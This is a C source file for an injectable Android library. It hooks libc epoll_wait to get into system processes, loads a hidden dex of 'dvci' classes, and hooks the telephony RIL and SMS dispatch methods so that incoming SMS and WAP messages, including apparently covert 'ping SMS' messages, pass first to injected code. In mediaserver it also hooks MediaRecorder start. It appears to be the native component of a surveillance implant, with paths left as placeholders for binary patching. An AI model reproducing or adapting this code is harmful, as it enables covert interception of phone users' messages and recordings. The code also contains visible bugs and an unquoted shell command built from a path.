/*
 *  Started from Collin's Dynamic Dalvik Instrumentation Toolkit for Android
 *  DP = DroppedBefore reaching processUnsollecited
 * - Tested :           ping SMS  |   malformed WAP
 * Galaxy nexus 2 A4.3        N(DB)   |     Y
 * Galaxy nexus 2 A4.0        N(DB)   |     N        Instrumentation on epoll_wait not working (never called)
 * CAT B15 A4.1               N(DB)   |     Y  Note: It seems wap messages aren't correctly dequeue and sent to the RIL 4/5 times
 * Huawey Y530  A4.3          Y       |     Y
 * LG G2 D802   A4.2.2        Y       |     Y
 * Samsung Galaxy S2          N(DB)   |     Y
 * LG l90    A4.4.2           Y       |     Y
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <string.h>
#include <termios.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <stdlib.h>
#include <jni.h>
#include "base.h"

#include "common.h"
#include "extern.h"
#include "hook.h"
#include "dexstuff.h"
#include "dalvik_hook.h"

#include "ipc_examiner.h"
char *dumpPath    =  ".................____________.......................";
char *dex    =  ".................____________......................1";
char *process    =  ".................____________......................2";
char *quite_needle = ".................____________......................";
char *dexFile_default = "/data/local/tmp/ddiclasses.dex";
char *dumpDir_default = "/data/local/tmp/";
char *dumpDir = NULL;
#undef log
#define USE_BD

#ifdef DEBUG
/*
 * Android log priority values, in ascending priority order.
 */
typedef enum android_LogPriority
{
   ANDROID_LOG_UNKNOWN = 0, ANDROID_LOG_DEFAULT, /* only for SetMinPriority() */
   ANDROID_LOG_VERBOSE, ANDROID_LOG_DEBUG, ANDROID_LOG_INFO, ANDROID_LOG_WARN, ANDROID_LOG_ERROR, ANDROID_LOG_FATAL, ANDROID_LOG_SILENT, /* only for SetMinPriority(); must be last */
} android_LogPriority;

//memset(tag,0,256-1);
char tag[256];
#define log(...) {\
tag[0]=tag[1]=0;\
snprintf(tag,256,"smsdispatch:%s",__FUNCTION__);\
__android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
#define logf(...) {FILE *f = fopen("/data/local/tmp/log", "a+");\
        if(f!=NULL){\
        fprintf(f,"%s: ",__FUNCTION__);\
        fprintf(f, __VA_ARGS__);\
        fflush(f); fclose(f); }}
#else
#define log(...)
#endif

//fnc declaration :
void create_cnf(char *cnf_name);
struct dexstuff_t d;

struct hook_t eph_epoll_w;
struct hook_t eph_epoll_p;
struct hook_t eph_media_const;
struct hook_t eph_media_start;
static struct dalvik_hook_t processUnsolicited_dh;
static struct dalvik_cache_t processUnsolicited_cache;
static struct dalvik_hook_t dispatchNormalMessage;
static struct dalvik_cache_t dispatchNormalMessage_cache;
static char createcnf = 0;

//arm version of hook
extern int my_epoll_wait_arm(int epfd, struct epoll_event *events, int maxevents, int timeout);
extern int my_epoll_pwait_arm(int epfd, struct epoll_event *events, int maxevents, int timeout, const sigset_t* ss);

// mediaserver instrumentation
extern int instrument_media(void);
extern int instrument_media_arm(void);
extern status_t mediaRecorder_start_arm(void);
extern status_t mediaRecorder_start(void);

// switch for debug output of dalvikhook and dexstuff code
static int debug;


void my_log(char *msg)
{
   log("%s", msg)
}
void my_log2(char *msg)
{
   if (debug)
      log("%s", msg);
}
long int and_maj = -1;
long int and_min = -1;
long int and_rel = -1;
void get_android_version()
{
   char android_version[10] = "";
   char *command = "getprop ro.build.version.release";
   FILE *fp = popen(command, "r");
   if (fgets(android_version, sizeof(android_version), fp) != NULL) {
      and_maj = strtol(&android_version[0], NULL, 10);
      and_min = strtol(&android_version[2], NULL, 10);
      and_rel = strtol(&android_version[4], NULL, 10);

      log("[*] version %s %d.%d.%d\n", android_version, and_maj, and_min, and_rel);
   } else {
      log("failed to get version\n");
   }
   if (fp) {
      pclose(fp);
   }
}
char * _fgetln(FILE *stream,size_t *len)
{
   static char *buffer = NULL;
   static size_t buflen = 0;
   if (stream == NULL) {
      log("stream null \n");
      return NULL;
   }
   if (buflen == 0) {
      buflen = 512;
      if ((buffer = malloc(buflen + 1)) == NULL){
         log("fatal: malloc: out of memory");
         return NULL;
      }
   }
   if (fgets(buffer, buflen + 1, stream) == NULL){
      log("no data available");
      free(buffer);
      return NULL;
   }
   *len = strlen(buffer);
   while (*len == buflen && buffer[*len - 1] != '\n') {
      char *tmp_buffer = NULL;
      if ((tmp_buffer = realloc(buffer, 2 * buflen + 1)) == NULL){
         log("fatal: realloc: out of memory");
         free(buffer);
         return NULL;
      }
      buffer = tmp_buffer;
      if (fgets(buffer + buflen, buflen + 1, stream) == NULL){
         log("no more data available");
         free(buffer);
         return NULL;
      }
      *len += strlen(buffer + buflen);
      buflen *= 2;
   }
   return buffer;
}
ssize_t getline(char **lineptr, size_t *n, FILE *stream)
{
   char *ptr;
   if(stream == NULL){
      log("stream null \n");
            return -1;
   }
   ptr = _fgetln(stream, n);
   if (ptr == NULL) {
      log("ptr null \n");
      return -1;
   }
   /* Free the original ptr */
   if (*lineptr != NULL)
      free(*lineptr);
   /* Add one more space for '\0' */
   size_t len = *n + 1;
   /* Update the length */
   n[0] = len;
   /* Allocate a new buffer */
   *lineptr = malloc(len);
   if(*lineptr){
      log("failed to malloc %d \n",len);
      return -1;
   }
   /* Copy over the string */
   memcpy(*lineptr, ptr, len - 1);
   /* Write the NULL character */
   (*lineptr)[len - 1] = '\0';
   /* Return the length of the new buffer */
   log("got %d :%s \n");
   return len;
}
// returned char pointer must be freed by the caller
static char * get_gobbler_pat(char *path)
{
   char *line = NULL;
   char *command = NULL;
   int read=0,len;
   if(path==NULL || strlen(path) <=0 ){
      log("invalid path passed\n");
      return line;
   }
   // allocate "ls " and the \0 plus strlen path
   size_t cmd_len = strlen(path) + 4;
   if(cmd_len>512){
      log("invalid path too long\n");

   }
   log("allocating %d long string",cmd_len);
   command=malloc(cmd_len);
   if(command == NULL){
      log("failed to alloc memory");
      return line;
   }
   memset(command,cmd_len,'\0');
   snprintf(command,cmd_len,"ls %s",path);
   log("calling %s",command);
   FILE *fp = popen(command, "r");
   if (fp) {
      while ((read = getline(&line, &len, fp)) != -1) {
         log("[*] files %s \n", line);
      }
      if (line) {
         if (strstr(line, path) == NULL) {
            free(line);
            log("failed to get gobbler\n");
         } else {
            log("got file %s\n", line);
         }
      }
   }else{
      log("failed to call %s\n",command);
   }
   if(command){
      free(command);
      command = NULL;
   }
   if (fp) {
      pclose(fp);
   }
   return line;
}
/* use global class and methods id to be used
 * during the printing of the exception stack.
 * We choose global ,to cache the lookup process
 * and be more responsive
 */
static jclass throw_class = NULL;
static jmethodID mid_throw_getCause = NULL;
static jmethodID mid_throw_getStackTrace = NULL;
static jmethodID mid_throw_toString = NULL;
static jclass frame_class = NULL ;
static jmethodID mid_frame_toString = NULL;

/*
 * who_am_i(unsigned int max_len)
 * return the command line of the current process or null in case of error
 * NOTE: the buffer containing the command line is allocated using
 * max_len parameter, It's up to the CALLER to FREE the BUFFER!!
 */
char * who_am_i(unsigned int max_len)
{
   FILE *f;
   char *cmdline = NULL;
   if(!max_len){
      log(" who_am_i() invalid arg passed\n");
      return cmdline;
   }
   if((cmdline=calloc(1,max_len))==NULL){
      log(" who_am_i() malloc failed\n");
      return cmdline;
   }

   f = fopen("/proc/self/cmdline", "r");
   if (f) {
      char *p = cmdline;
      fgets(cmdline, max_len-1, f);
      fclose(f);
      cmdline[max_len-1]='\0';
      log(" who_am_i() cmdline is=\"%s\"\n",cmdline);
   }else{
      log(" who_am_i() opening file \"/proc/self/cmdline\" failed\n");
      free(cmdline);
      cmdline=NULL;
   }
   return cmdline;

}
int load_dext(char * dext_path,char **classes)
{

   int cookie = 0;
   int res =0;
   char *file=dext_path;
   if (dext_path == NULL) {
      log(" loaddex null path passed\n");
      return 1;
   }else{
      log(" loaddex path %s\n",file);
   }
   if(strstr(dext_path,"*")!=NULL){
      log(" loaddex gobbler passed\n");
      file=get_gobbler_pat(dext_path);
      if(file!=NULL){
         cookie = dexstuff_loaddex(&d, file);
      }else{
         file = dext_path;
      }
      return 1;
   }
   cookie = dexstuff_loaddex(&d, file);
   log("loaddex res = %x\n", cookie)
   if (!cookie) {

      log("make sure /data/dalvik-cache/ is world writable");
      res=1;
   }
   if(res==0){

   int  i = 0;
   void *clazz = NULL;
   if(classes){
   while (classes[i] != NULL) {
      //log("loading class %s", classes[i]);
         clazz = dexstuff_defineclass(&d, classes[i], cookie);
         //log("Cfg = 0x%x\n", clazz);
         if (clazz == 0) {
            log("failure loading class %s", classes[i]);
            res = 1;
            break;
         }
         i++;
      }
   }
   }
   if(file != dext_path){
      log("Freeing file\n");
      free(file);
   }

   return res;
}
static char *classes[] = {
         "com/android/dvci/event/OOB/SMSDispatch",
         "com/android/dvci/util/Reflect",
         "com/android/dvci/util/LowEventMsg",
         "com/android/dvci/util/ReflectException",
         "com/android/dvci/auto/Cfg",
         "com/android/dvci/file/AutoFile",
         "com/android/dvci/file/Path",
         "com/android/dvci/util/Check",
         "com/android/internal/telephony/GsmAlphabet",
         "com/android/dvci/util/DateTime",
         "com/android/dvci/util/Utils",
         NULL };
//private void processUnsolicited (Parcel p)
static void my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
{
   jint callOrig = 1;
   int doit = 1;
   if( p== 0x0){
      log("invalid parcel pointer");
      return ;
   }
   log("parcel pointer p=%p",p);

/*
   if(ops != 1003){
      log("not our ops %d",ops);
      return callOrig;
   }
   */
   //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
   (*env)->MonitorEnter(env,this);

   if (processUnsolicited_cache.cls_h == 0) {
      if (load_dext(dex, classes)) {
         log("failed to load class ");
         doit = 0;
      }
   } else {
    log("using cache");
  }

   if (doit) {
      // call static method and passin the sms
      //log(" parcel = 0x%x\n", p)
      if (processUnsolicited_cache.cls_h == 0) {
         processUnsolicited_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
      }
      if (processUnsolicited_cache.cls_h != 0) {
         if (processUnsolicited_cache.mid_h == 0) {
            processUnsolicited_cache.mid_h = (*env)->GetStaticMethodID(env, processUnsolicited_cache.cls_h, "dispatchParcel", "(Landroid/os/Parcel;)I");
         }
         if (processUnsolicited_cache.mid_h) {
            callOrig = (*env)->CallStaticIntMethod(env, processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h, p);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
      }
   }
   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionDescribe(env);
      //dalvik_dump_class(&d,"");
      log("<-- description");
      (*env)->ExceptionClear(env);
   }
   (*env)->MonitorExit(env,this);
   dalvik_prepare(&d, &processUnsolicited_dh, env);

   //if (callOrig) {

      (*env)->CallVoidMethod(env, this, processUnsolicited_dh.mid, p);
      if ((*env)->ExceptionOccurred(env)) {
         log("got an exception calling orig");
         (*env)->ExceptionDescribe(env);
         log("<-- description");
         (*env)->ExceptionClear(env);
      } else {
         log("success calling : %s\n", processUnsolicited_dh.method_name)
      }
   //} else {
   //   log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
  //}
   dalvik_postcall(&d, &processUnsolicited_dh);

}
static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessageBase)
{
   jint callOrig = 1;
   int go_ahead=1;

     if (dispatchNormalMessage_cache.cls_h == 0) {
        if (load_dext(dex, classes)) {
           log("failed to load class ");
           go_ahead = 0;
        }
     } else {
      log("using cache");
    }

     if (go_ahead) {
        // call static method and passin the sms
        //log(" parcel = 0x%x\n", p)
        if (dispatchNormalMessage_cache.cls_h == 0) {
           log("smsMessageBase = 0x%x\n", smsMessageBase)
           dispatchNormalMessage_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
        }
        if (dispatchNormalMessage_cache.cls_h != 0) {
           if (dispatchNormalMessage_cache.mid_h == 0) {
              dispatchNormalMessage_cache.mid_h = (*env)->GetStaticMethodID(env, dispatchNormalMessage_cache.cls_h, "dispatchNormalMessage", "(Ljava/lang/Object;)I");
           }
           if (dispatchNormalMessage_cache.mid_h) {
              jvalue args[1];
              args[0].l = smsMessageBase;
              callOrig = (*env)->CallStaticIntMethodA(env, dispatchNormalMessage_cache.cls_h, dispatchNormalMessage_cache.mid_h, args);
           } else {
              log("method not found!\n")
           }
        } else {
           log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
        }
     }

   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionClear(env);

   }
   jvalue args[1];
   dalvik_prepare(&d, &dispatchNormalMessage, env);
   if (callOrig) {
      args[0].l = smsMessageBase;
      callOrig = (*env)->CallIntMethodA(env, obj, dispatchNormalMessage.mid, args);
      log("success calling : %s\n", dispatchNormalMessage.method_name)
   } else {
      log("skipping pdu args for call : %s\n", dispatchNormalMessage.method_name)
      callOrig = 1;
   }
   dalvik_postcall(&d, &dispatchNormalMessage);
   return callOrig;
}


static int instrument(){

   // resolve symbols from DVM

   log("my_epoll_wait: try_hook\n")
   if( strncmp(quite_needle,process,strlen(quite_needle)) == 0 ){
      dexstuff_resolv_dvm(&d);
      int hooked = 2;
      log("hooking sms\n")
      if (and_maj == 4){
         //private void processUnsolicited (Parcel p) {
         processUnsolicited_cache.cls_h = NULL;
         processUnsolicited_cache.mid_h = NULL;
         dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
         if (dalvik_hook(&d, &processUnsolicited_dh)) {
            log("my_epoll_wait: hook processUnsolicited ok\n");
            hooked--;
         } else {
            log("my_epoll_wait: hook processUnsolicited fails\n");
         }
         if ( and_min < 4) {
            dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/SMSDispatcher;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
            if (dalvik_hook(&d, &dispatchNormalMessage)) {
               log("my_epoll_wait: hook dispatchNormalMessage ok\n");
               hooked--;
            } else {
               log("my_epoll_wait: hook dispatchNormalMessage fails\n");
            }
         } else if (and_min >= 4) {

            dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/InboundSmsHandler;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
            if (dalvik_hook(&d, &dispatchNormalMessage)) {
               log("my_epoll_wait: hook dispatchNormalMessage ok\n");
               hooked--;
            } else {
               log("my_epoll_wait: hook dispatchNormalMessage fails\n");
            }

         }
         if(dumpDir!=NULL && hooked == 0 && createcnf){
            create_cnf("pa.cnf");
         }
   } else {
      log("injection not possible \n");
      return 1;
   }
   }else if( strncmp("mediaserver",process,strlen("mediaserver")) == 0 ){
      log("instrumenting mediaserver\n")
      return instrument_media();
   }else{
      log("hooking unknown so skip\n")
      return 1;
   }
   return 0;

}
//int epoll_pwait(int fd, epoll_event* events, int max_events, int timeout, const sigset_t* ss)
int my_epoll_pwait(int epfd, struct epoll_event *events, int maxevents, int timeout,const sigset_t* ss)
{
   int (*orig_epoll_pwait)(int epfd, struct epoll_event *events, int maxevents, int timeout,const sigset_t* ss);
   orig_epoll_pwait = (void*) eph_epoll_p.orig;

   int inst_res=0;

   if((inst_res=instrument())){
      if(inst_res!=-1){
         log("hooking failed\n")
      }
   }
   // remove hook for epoll_wait
   hook_precall(&eph_epoll_p);
   int res = orig_epoll_pwait(epfd, events, maxevents, timeout,ss);
   if(inst_res==-1){
      log("still in zygote (<pre-initialized>) process, waiting full specialization...\n");
      // reinstrument
      hook_postcall(&eph_epoll_p);
   }
   return res;
}
int my_epoll_pwait_thumb(int epfd, struct epoll_event *events, int maxevents, int timeout, const sigset_t* ss)
{
   return my_epoll_pwait(epfd,events,maxevents,timeout,ss);
}
int my_epoll_wait_thumb(int epfd, struct epoll_event *events, int maxevents, int timeout)
{
   return my_epoll_wait(epfd,events,maxevents,timeout);
}
int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
{
   int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
   orig_epoll_wait = (void*) eph_epoll_w.orig;
   // remove hook for epoll_wait
   int inst_res=0;

   if((inst_res=instrument())){
      if(inst_res>1){
         log("hooking failed %d\n",inst_res)
      }
   }
   // remove hook for epoll_wait
   hook_precall(&eph_epoll_w);
   int res = orig_epoll_wait(epfd, events, maxevents, timeout);
   if(inst_res==-1){
      log("still in zygote (<pre-initialized>) process, waiting full specialization...\n");
      // reinstrument
      hook_postcall(&eph_epoll_w);
   }
   return res;
}
void create_cnf(char *cnf_name)
{
   int full_path_log_filename_length = strlen(dumpDir) + 1 + strlen(cnf_name) + 1;
   char * full_path_log_filename = malloc(sizeof(char) * full_path_log_filename_length);
   if (full_path_log_filename != NULL) {
      snprintf(full_path_log_filename, full_path_log_filename_length, "%s/%s", dumpDir,cnf_name);
      int fd = open(full_path_log_filename, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
      if (fd > 0) {
         log("create_cnf: wrote log file %s fd %d\n", full_path_log_filename, fd);
         close(fd);
         createcnf = 0;
      }else{
         log("create_cnf: open failed with file %s",full_path_log_filename);
      }
      free(full_path_log_filename);
   }else{
      log("create_cnf: malloc failed");
   }
}
char * findLast(char *where, char *what){

   char *ptr = where;
   char *prevptr = NULL;
   if(what == NULL  || where == NULL){
      log("findLast: invalid ponter passed");
      return NULL;
   }
   while( (ptr = strstr(ptr,what)))
   {
   // increment ptr here to prevent
   // an infinite loop
   prevptr = ptr++;
   }
   // now, prevptr contains the last occurrence
   return prevptr;
}


// set my_init as the entry point
void __attribute__ ((constructor)) my_init(void);



void my_init(void)
{
   int ff = 0xdeadf16a;

   char *lastAt = NULL;
   log("started\n");
   get_android_version();

#ifdef DEBUG
   debug = 1;
#endif
   log("my_init:dumpPath is %s\n",dumpPath);
   if( strncmp(quite_needle,dumpPath,strlen(quite_needle)) == 0 ){
      /* No binary patch applied, use the default value of the dexfile */
      log("my_init: got path %s\n",dumpPath);
      dumpDir = dumpDir_default;
      ff++;
   }else{
      log("my_init: path patched %s\n",dumpPath);
      dumpDir = dumpPath;
      ff--;
   }
   createcnf = 1;
   if( strncmp(quite_needle,dex,strlen(quite_needle)) == 0 ){
      /* No binary patch applied, use the default value of the dexfile */
      log("my_init: got dex %s\n",dexFile_default);
      dex = dexFile_default;
   }else{
      log("my_init: dexfile patched %s\n",dex);
   }

   // set log function for  libbase (very important!)
   set_logfunction(my_log2);
   // set log function for libdalvikhook (very important!)
   dalvikhook_set_logfunction(my_log2);
   if( strncmp("mediaserver",process,strlen("mediaserver")) == 0 ){
      log("hooking mediaserver\n");
     // todo: not ready if(hook(&eph_media_const, getpid(), "libmedia.", "_ZN7android13MediaRecorderC1Ev",  instrument_media_arm, instrument_media) && createcnf==1){
     //    log("my_init: media build1 hooked\n");
     // }
      if(hook(&eph_media_start, getpid(), "libmedia.", "_ZN7android13MediaRecorder5startEv",  mediaRecorder_start_arm, mediaRecorder_start) && createcnf==1){
         log("my_init: media start hooked\n");
      }
      if(hook(&eph_epoll_w, getpid(), "libc.", "epoll_wait", my_epoll_wait, my_epoll_wait_thumb) && createcnf==1){
                 log("my_init: epoll_wait hooked\n");
      }
      char *cmdline = who_am_i(64);
      if(cmdline){
         if( strcasestr(cmdline,"zygote")!=NULL ){
            if(dumpDir!=NULL  && createcnf){
               create_cnf("mm.cnf");
            }
         }
         free(cmdline);
      }

   }else{
      /*
      if (and_maj==5 || (and_maj==4 && and_min==0) ){

         if(hook(&eph_epoll_p, getpid(), "libc.", "epoll_pwait", my_epoll_pwait_arm, my_epoll_pwait_thumb) && createcnf==1){
            log("my_init: epoll_pwait hooked\n");
         }
      }else{
*/
         if(hook(&eph_epoll_w, getpid(), "libc.", "epoll_wait", my_epoll_wait, my_epoll_wait_thumb) && createcnf==1){
            log("my_init: epoll_wait hooked\n");
         }
    //  }
      dexstuff_resolv_dvm(&d);
   }



   //log("my_init: printClass\n");
   //dalvik_dump_class(&d,"");
}
void my_remove(void){

   log("my_remove:dumpPath is %s\n",dumpPath);
   log("my_remove:dex %s\n",dexFile_default);
   log("my_remove:process %s\n",process);
}
